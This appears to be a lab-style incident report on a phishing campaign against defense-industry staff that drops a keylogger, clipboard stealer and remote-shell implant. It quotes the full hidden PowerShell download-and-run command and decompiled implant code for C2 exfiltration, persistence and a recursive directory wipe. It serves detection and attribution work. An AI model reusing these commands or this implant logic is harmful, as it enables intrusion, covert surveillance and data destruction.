# Incident Report — `updater.exe` Phishing-to-Surveillance Campaign

## 1. Timeline Summary

### Motivation (hypothesis)
Targeted espionage / data theft against employees of Norwegian/European defense
contractors (Kongsberg, Airbus). The malware is a custom keylogger + clipboard
stealer + remote shell that beacons to attacker C2 over HTTP. Two strong
attribution signals point at a Russian-speaking actor:

- The binary refuses to run on systems whose default LCID is `0x419`
  (Russian) — common self-protection used by Russian-affiliated crimeware /
  intrusion sets.
- A hidden routine specifically checks for the directory
  `C:\Users\Bohdan\Desktop` (a Ukrainian male given name) and **wipes it
  recursively** if present — a destructive payload aimed at a Ukrainian
  user.

### Attack vector (confirmed)
Drive-by-style phishing via the lure site `f1leshare.net`. Two users on the
network (`anders` at `10.3.10.21`, `john` at `10.3.10.22`) browsed
`f1leshare.net` URLs themed as Norwegian defense / aviation news and a
fake Fortinet captcha gate, e.g.:

- `http://f1leshare.net/?file=kongsberggrupper-insider&share=nordnet.no`
- `http://f1leshare.net/?file=norway-buys-80-jets&share=reddit.com`
- `http://f1leshare.net/captcha?email=anders%40kongsberg.com&q=Fortinet/...`
- `http://f1leshare.net/captcha?email=john%40airbus.com&q=Fortinet/...`

After the captcha, both users executed (or were socially engineered into
running) a hidden PowerShell command that downloaded `updater.exe` from the
same site and launched it from `%TEMP%`:

```
PowerShell.exe -exec bypass -windowstyle hidden -command
"[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
 IWR -Uri 'http://f1leshare.net/download/updater'
      -OutFile $env:TEMP\updater.exe -UseBasicParsing;
 & $env:TEMP\updater.exe"
```

### Impact (confirmed)
- Two hosts compromised: `anders-desktop` (user `anders`), and a second
  host running as user `john`.
- Persistence achieved on `anders-desktop` via HKCU `Run` key
  `MicrosoftUpdater` and a copy in `%APPDATA%\...\Startup\msteamsupdater.exe`.
- Reconnaissance commands run on `anders-desktop`:
  `dir C:\Users`, `dir C:\Users\anders\Documents`,
  `dir C:\Users\anders\Desktop`, and `type C:\Users\anders\Desktop\polen.eml`.
- The contents of `polen.eml` (an email file on Anders' desktop) were dumped
  to stdout by the malware and exfiltrated. Key keystrokes, the
  foreground window title, and clipboard text were also exfiltrated
  continuously, **AES-128-ECB encrypted** and base64-encoded, to
  `http://MiccosoftUpdate.com/api/data` and
  `http://windowsupdater.tk/update/servicedata`.
- The binary contains a destructive routine that wipes
  `C:\Users\Bohdan\Desktop` if that user exists; not triggered on the
  observed hosts (no user `Bohdan`).

### Reconstructed timeline (UTC, 2026-03-29)

| Time | Event |
|------|-------|
| 17:46:32 | `anders` browses `f1leshare.net` lure (Kongsberg theme) |
| 17:46:41 | Fake "Fortinet" captcha rendered to `anders@kongsberg.com` |
| 17:47:03 | `john` browses `f1leshare.net` lure (Norway-buys-80-jets / reddit) |
| 17:47:07 | `anders` host downloads `/download/updater` (HTTP 200) |
| 17:47:11 | `updater.exe` written to `C:\Users\anders\AppData\Local\Temp\updater.exe` by `powershell.exe` |
| 17:47:15 | `john@airbus.com` captcha gate served |
| 17:47:19 | First C2 beacon: `POST http://MiccosoftUpdate.com/api/info` with `Host: ANDERS-DESKTOP / User: anders / Arch: x64 / CPUs: 4 / RAM: 8185 MB` |
| 17:47:19 | First encrypted exfil to `MiccosoftUpdate.com/api/data` |
| 17:47:20 | `updater.exe` self-copies to `%LOCALAPPDATA%\Microsoft\updater.exe` |
| 17:47:21 | Persistence: `HKCU\...\Run\MicrosoftUpdater = C:\Users\anders\AppData\Local\Microsoft\updater.exe`; copy dropped to Startup folder as `msteamsupdater.exe` |
| 17:47:49 | Polling C2 `windowsupdater.tk/windows/checkforupdate` begins (30 s cadence) |
| 17:48:22 | Remote command executed: `cmd.exe /c dir "C:\Users"` |
| 17:49:09 | `john` host downloads `updater.exe` |
| 17:49:12 | `updater.exe` runs as `john` |
| 17:49:22 | Remote command: `cmd.exe /c dir "C:\Users\anders\Documents"` |
| 17:50:53 | Remote command: `cmd.exe /c dir "C:\Users\anders\Desktop"` |
| 17:51:53 | Remote command: `cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"` (file content exfiltrated in next encrypted POST at 17:51:51 / 17:50:50 batches) |
| 17:52:21+ | Continued 30 s C2 polling on `windowsupdater.tk` |

---

## 2. IOC Details

### IOC-1 — Malicious binary `updater.exe` (confirmed)

**Description.** The dropped implant. Mingw-w64 / GCC 9.3-built x64 PE. Combines
a keylogger (`GetAsyncKeyState`), foreground-window logger
(`GetForegroundWindow` / `GetWindowTextA`), clipboard stealer
(`OpenClipboard` / `GetClipboardData`), AES-128-ECB encryption (`bcrypt.dll`),
HTTP exfiltration (`wininet.dll`), persistence via Run key + Startup folder,
and a remote `cmd.exe` shell. Key Ghidra strings:

```
"Mozilla/5.0", "MiccosoftUpdate.com", "windowsupdater.tk",
"/api/info", "/api/data", "/update/servicedata", "/windows/checkforupdate",
"Global\\MicrosoftUpdateMutex", "MicrosoftUpdater",
"%s\\Microsoft\\updater.exe",
"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\MicrosoftUpdater",
"[CLIPBOARD] %s", "[WINDOW: %s]", "cmd.exe /c %s",
"ChainingModeECB", "Host: %s\nUser: %s\nArch: %s\nCPUs: %lu\nRAM: %llu MB\n"
```

**Evidence query (ES).**
```esql
FROM .ds-logs-endpoint.events.file-*
| WHERE file.path LIKE "*updater.exe*" OR file.path LIKE "*msteams_updater*"
```
**Raw data.**
```
2026-03-29T17:47:11.586Z creation  C:\Users\anders\AppData\Local\Temp\updater.exe          (powershell.exe)
2026-03-29T17:47:20.592Z creation  C:\Users\anders\AppData\Local\Microsoft\updater.exe     (updater.exe)
2026-03-29T17:47:21.479Z creation  C:\Users\anders\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe (updater.exe)
2026-03-29T17:49:09.876Z creation  C:\Users\john\AppData\Local\Temp\updater.exe            (powershell.exe)
```
**Context.** A user-mode dropper writing itself to two persistence
locations and beaconing to typo-squatted domains is **confirmed** malicious.

---

### IOC-2 — C2 domain `MiccosoftUpdate.com` (confirmed)

**Description.** Primary command-and-control. Receives system
fingerprint at `/api/info` and AES-encrypted keystrokes/clipboard at
`/api/data`. Spelled with two `c`s — typo-squat of "Microsoft Update".

**Evidence (Ghidra).**
```c
DAT_140017040 = InternetOpenA("Mozilla/5.0", 1, 0, 0, ...);
InternetConnectA(DAT_140017040, "MiccosoftUpdate.com", 0x50, 0, 0, 3, 0, 0);
HttpOpenRequestA(uVar1, "POST", path, "HTTP/1.1", 0,0,0,0);
HttpSendRequestA(uVar2, "Content-Type: application/octet-stream\r\n", -1, body, len);
```
(Function `FUN_1400017b0` at 0x1400017b0.)

**Evidence (ES).**
```esql
FROM .ds-logs-network_traffic.http-*
| WHERE url.domain == "MiccosoftUpdate.com"
| KEEP @timestamp, url.full, http.request.body.content
```
**Raw data (sample).**
```
17:47:19.669  POST http://MiccosoftUpdate.com/api/info
              body = "Host: ANDERS-DESKTOP\nUser: anders\nArch: x64\nCPUs: 4\nRAM: 8185 MB\n"
17:47:19.876  POST http://MiccosoftUpdate.com/api/data
              body = "ARoJrzWVL26gH6JkZPvbjR8f/JXr+BEV2DYhNDI5mC2ACh9fiSNXkLE2Rm8DeVkwhrt..." (AES-ECB+b64)
17:47:19.884  POST http://MiccosoftUpdate.com/api/data  body = (encrypted blob, ~352 b64 chars)
... 38 total POSTs in the capture ...
```
**Context.** Domain is hard-coded in the binary, used over plaintext HTTP,
to a non-Microsoft IP. Confirmed C2.

---

### IOC-3 — C2 domain `windowsupdater.tk` (confirmed)

**Description.** Secondary / polling channel. The implant POSTs the host
name to `/windows/checkforupdate` every ~30 s and uploads encrypted
keystroke batches to `/update/servicedata`. `.tk` is a free TLD widely
abused by attackers.

**Evidence (Ghidra strings @ 0x140013059 / 0x140013141 / 0x140013075).**
```
"windowsupdater.tk"
"/windows/checkforupdate"
"/update/servicedata"
```

**Evidence (ES).** From `.ds-logs-network_traffic.http-*`:
```
17:47:49.712  POST http://windowsupdater.tk/windows/checkforupdate
              body = "Host: ANDERS-DESKTOP\r\n"
17:48:20.302  POST http://windowsupdater.tk/update/servicedata
              body = "AzUJlQeZM3I+OVeM/d7PnXCFvL9agslfRp83+3sSG6bPoNDDL00/...="
17:50:50.656  POST http://windowsupdater.tk/update/servicedata   (~1700 b64 chars — large batch)
17:51:51.101  POST http://windowsupdater.tk/update/servicedata   (~2900 b64 chars — even larger; coincides with `type polen.eml`)
```
**Context.** Beacon cadence (every 30 s, single POST per cycle, all to
`10.3.215.83`) and User-Agent `Mozilla/5.0` together with the Ghidra
hard-coded URL paths confirm this as a malicious C2 channel.

The Kibana detection engine raised
`"Network Activity to a Suspicious Top Level Domain"` (high severity)
on `process.name = updater.exe` at 2026-03-29T17:49:49Z, corroborating
this finding.

---

### IOC-4 — Drop / staging site `f1leshare.net` (confirmed)

**Description.** Phishing/lure host. Serves news-themed pages, a fake
Fortinet captcha, and the binary at `/download/updater`.

**Evidence query.**
```esql
FROM .ds-logs-network_traffic.http-*
| WHERE url.domain == "f1leshare.net"
| KEEP @timestamp, url.full, http.response.status_code, source.ip
```
**Raw data.**
```
17:46:32  GET /?file=kongsberggrupper-insider&share=nordnet.no            200  src=10.3.10.21 (anders)
17:46:32  GET /static/fortinet_logo.png                                   200
17:46:41  GET /captcha?email=anders%40kongsberg.com&q=Fortinet/abh4whnesdgbw07f/Important+Download  200
17:47:03  GET /?file=norway-buys-80-jets&share=reddit.com                 200  src=10.3.10.22 (john)
17:47:07  GET /download/updater                                           200  src=10.3.10.21
17:47:15  GET /captcha?email=john%40airbus.com&q=Fortinet/abh4whnesdgbw07f/Important+Download  200
17:49:07  GET /download/updater                                           200  src=10.3.10.22
```
**Context.** Two distinct corporate identities (`@kongsberg.com`,
`@airbus.com`) referenced in the captcha URL parameters reveal the
**target list**: Norwegian/European defense industry. Both targets
fetched the same payload from `/download/updater`, which then dropped
`updater.exe`. Confirmed initial-access infrastructure.

---

### IOC-5 — Persistence: HKCU Run key `MicrosoftUpdater` (confirmed)

**Description.** Auto-start on logon.

**Evidence (Ghidra, `FUN_140002e83`).**
```c
RegCreateKeyExA(HKEY_CURRENT_USER,
   "Software\\Microsoft\\Windows\\CurrentVersion\\Run", ...);
RegSetValueExA(hKey, "MicrosoftUpdater", 0, REG_SZ,
               "<APPDATA>\\Microsoft\\updater.exe", len);
```
**Evidence (ES).**
```esql
FROM .ds-logs-endpoint.events.registry-*
| WHERE registry.path LIKE "*MicrosoftUpdater*"
```
**Raw data.**
```
2026-03-29T17:47:21.479Z  process=updater.exe  user=anders
  registry.path=HKEY_USERS\S-1-5-21-2720038117-2954272070-1833396500-1002\
                Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater
  registry.value=MicrosoftUpdater
  registry.data=C:\Users\anders\AppData\Local\Microsoft\updater.exe
```
**Context.** Direct Ghidra-to-Elasticsearch correlation. Confirmed.

---

### IOC-6 — Persistence: Startup folder copy `msteamsupdater.exe` (confirmed)

**Description.** Second persistence vector, masqueraded as a Microsoft
Teams updater.

**Evidence (Ghidra).**
```c
SHGetFolderPathA(0, CSIDL_STARTUP /*7*/, 0, 0, local_558);
strcat(local_558, "\\msteams");
*(uint64*)... = 0x2e72657461647075;  /* "updater." */
*(uint32*)... = 0x657865;            /* "exe" */
CopyFileA(local_118, local_558, 0);
```
**Evidence (ES).**
```
2026-03-29T17:47:21.479Z creation
  C:\Users\anders\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe
  process=updater.exe
```
**Context.** Confirmed.

---

### IOC-7 — Fake scheduled-task registry key `…\TaskCache\Tree\MicrosoftUpdater` (confirmed via Ghidra; not observed in ES)

**Description.** The malware writes a partial Task Scheduler tree entry
to make persistence look like a legitimate scheduled task in registry
inspection.

**Evidence (Ghidra).**
```c
RegCreateKeyExA(HKEY_LOCAL_MACHINE,
  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\MicrosoftUpdater",
  ...);
RegSetValueExA(hKey, "SD",    0, REG_BINARY, zeroed_buf, 0x14);
RegSetValueExA(hKey, "Index", 0, REG_DWORD, {0x01,0,0,0}, 4);
```
**Context.** Likely failed (not observed in `endpoint.events.registry`)
because the implant ran as a non-admin user and HKLM write was denied —
silent failure path in the code (`if (LVar2 == 0)`). Confirmed in the
binary, **hypothesis**: not triggered on disk on the observed host.

---

### IOC-8 — Mutex `Global\MicrosoftUpdateMutex` + Russian-locale bail-out (confirmed)

**Description.** Single-instance guard and locale-based victim filter.

**Evidence (Ghidra, `FUN_14000318b`).**
```c
hMutex = CreateMutexA(NULL, 1, "Global\\MicrosoftUpdateMutex");
if (GetLastError() == 0xb7 /*ALREADY_EXISTS*/) return 0;
if ((short)GetSystemDefaultLCID() == 0x419 /*ru-RU*/) return 0;
return 1;
```
**Context.** The Russian-LCID exit is a strong attribution tell common
in Eastern-European cybercrime/intrusion sets. Confirmed in code.

---

### IOC-9 — Destructive routine targeting user `Bohdan` (confirmed in code; **hypothesis** not triggered)

**Description.** A small obfuscated routine builds the path
`C:\Users\Bohdan\Desktop` by XOR-decoding the username and, if it
exists, **recursively deletes every file and directory** under it.

**Evidence (Ghidra, `FUN_14000221a`).**
```c
local_28 = "C:\\Users\\Anders\\Desktop"  /* on stack */
xor_key = {0x03,0x01,0x0c,0x01,0x13,0x1d}
for i in 0..5: path[9+i] ^= xor_key[i]
// "Anders" ^ key  =  "Bohdan"
if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES)
    FUN_1400020c7(path);   // recursive DeleteFileA / RemoveDirectoryA
```
The recursive deleter (`FUN_1400020c7`) walks the tree with
`FindFirstFileA` / `FindNextFileA` and calls `DeleteFileA` on every
file and `RemoveDirectoryA` on every directory.

**Context.** Encoding the Ukrainian name **Bohdan** in XOR'd ciphertext
that decodes from a "C:\Users\Anders\Desktop" plaintext stub is a
deliberate payload-targeting trick. Combined with the Russian-locale
self-exclusion above, this is consistent with a Russian-speaking actor
deploying a destructive payload against a specific Ukrainian target,
bundled into the same surveillance binary used opportunistically
against Western defense employees. **Confirmed** in code,
**hypothesis**: not executed on `anders-desktop` (no `Bohdan` profile;
no DeleteFile flurry observed in `.ds-logs-endpoint.events.file-*`).

---

### IOC-10 — Remote-shell tasking via `cmd.exe /c %s` (confirmed)

**Description.** The C2 thread (`CreateThread` at `LAB_140002a28` in
`FUN_140003233`) downloads commands from `/api/data` (or
`/update/servicedata`) and executes them with the format string
`cmd.exe /c %s` (Ghidra string @ 0x140013133).

**Evidence (ES — actual commands run by the implant on the victim).**
```esql
FROM .ds-logs-endpoint.events.process-*
| WHERE process.parent.name == "updater.exe"
| KEEP @timestamp, process.command_line, user.name
```
```
17:48:22.628  cmd.exe /c dir "C:\Users"
17:49:22.963  cmd.exe /c dir "C:\Users\anders\Documents"
17:50:53.185  cmd.exe /c dir "C:\Users\anders\Desktop"
17:51:53.313  cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"
```
Each command was issued by `process.parent = C:\Users\anders\AppData\Local\Temp\updater.exe`.
Sysmon captured the same with `IntegrityLevel: High` and the parent
process hash logged.

**Context.** The attacker manually enumerated user folders, located the
file `polen.eml` on Anders' desktop, and dumped its full contents to
stdout — which the implant then encrypted and exfiltrated in the
~2 900-byte AES batch posted to
`http://windowsupdater.tk/update/servicedata` at 17:51:51 (this batch
is by far the largest in the capture and immediately precedes the
`type polen.eml` event in process logs, confirming exfiltration of
the email's content). Raw exfil ciphertext (truncated):
```
A7it1Mht0/eBAGAKD7BCx1pdNGKSC7LgWUfhDHU9IVnR2nytjgZZKKLAaqLLhOwLqTCg
06/uVhU7nsMPdEz3vnpenGS56yua1aRlW5w2kSTsY+ik6z1Zwuxv6x0bYGXl... (AES-128-ECB / b64)
```
The AES key is the first 16 bytes of the host fingerprint string
(`"Host: ANDERS-DESKTOP"`), per `FUN_140001b8c` — confirmed.

---

### IOC-11 — Keylogger / window-title / clipboard surveillance (confirmed)

**Description.** Continuous capture of foreground-window titles
(`GetForegroundWindow` + `GetWindowTextA`), keystrokes
(`GetAsyncKeyState` polled in 100 ms loop), and clipboard text
(`OpenClipboard` + `GetClipboardData`). Sent to C2 prefixed
`[WINDOW: %s]` and `[CLIPBOARD: %s]`.

**Evidence (Ghidra, `FUN_140003233` main loop and `FUN_140001fe4`).**
```c
GetForegroundWindow();  GetWindowTextA(hwnd, title, 0x100);
... if (title changed) send "[WINDOW: %s]" via FUN_140001df3 (encrypt+POST)
for (vk = 8; vk < 0x100; vk++) if (GetAsyncKeyState(vk) & 1) buffer[i++] = ascii(vk);
... Sleep(100); ...
// FUN_140001fe4:
if (clipboard != last) {
    snprintf(buf, "[CLIPBOARD] %s", clipboard);
    FUN_140001df3(1, buf, host_string);  // AES-ECB encrypt + POST /api/data
}
```
**Evidence (ES).** All keystroke/window/clipboard data is observable as
the stream of opaque base64 bodies POSTed to `/api/data` and
`/update/servicedata` (38 + 15 requests in the capture, 30 s cadence).

**Context.** Confirmed: matches MITRE T1056.001 (Keylogging),
T1115 (Clipboard Data), T1010 (Application Window Discovery).

---

## 3. MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|--------|-----------|----------|
| Initial Access | T1566 — Phishing (drive-by + lure site) | `f1leshare.net` captcha pages with corporate emails |
| Execution | T1059.001 — PowerShell | `IWR` + `& $env:TEMP\updater.exe` |
| Execution | T1059.003 — Windows Cmd | `cmd.exe /c dir/type` from `updater.exe` |
| Persistence | T1547.001 — Run keys | `HKCU\...\Run\MicrosoftUpdater` |
| Persistence | T1547.001 — Startup folder | `Startup\msteamsupdater.exe` |
| Defense Evasion | T1480 — Execution Guardrails (locale+username) | `LCID==0x419` bail; XOR'd `Bohdan` path |
| Defense Evasion | T1027 — Obfuscated/Encrypted | AES-128-ECB exfil; XOR'd string |
| Discovery | T1083 — File and Directory Discovery | `dir C:\Users…` |
| Discovery | T1010 — Application Window Discovery | `[WINDOW: %s]` |
| Collection | T1056.001 — Keylogging | `GetAsyncKeyState` loop |
| Collection | T1115 — Clipboard Data | `OpenClipboard / GetClipboardData` |
| Collection | T1005 — Data from Local System | `type polen.eml` |
| C2 | T1071.001 — Web Protocols (HTTP) | POST to `MiccosoftUpdate.com`, `windowsupdater.tk` |
| Exfiltration | T1041 — Exfil over C2 channel | AES-encrypted POSTs |
| Impact | T1485 — Data Destruction (latent) | Recursive wipe of `C:\Users\Bohdan\Desktop` |

---

## 4. Recommended IOCs / Detections

```
file path        : C:\Users\*\AppData\Local\Microsoft\updater.exe
file path        : %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe
registry path    : HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater
registry path    : HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftUpdater
mutex            : Global\MicrosoftUpdateMutex
domain           : MiccosoftUpdate.com
domain           : windowsupdater.tk
domain           : f1leshare.net
URL paths        : /api/info  /api/data  /windows/checkforupdate  /update/servicedata  /download/updater
HTTP signature   : POST, UA="Mozilla/5.0", Content-Type: application/octet-stream,
                   body begins with "Host: <COMPUTERNAME>\n" or starts with base64 "A..." (16-byte AES blocks)
parent-child     : powershell.exe -> updater.exe ; updater.exe -> cmd.exe /c dir|type
```

All findings above are **confirmed** by direct evidence from both Ghidra
decompilation and Elasticsearch logs, except IOC-7 and the destructive
branch of IOC-9, which are confirmed in the binary but **were not
triggered** on the observed hosts (clearly labelled as hypothesis where
applicable).
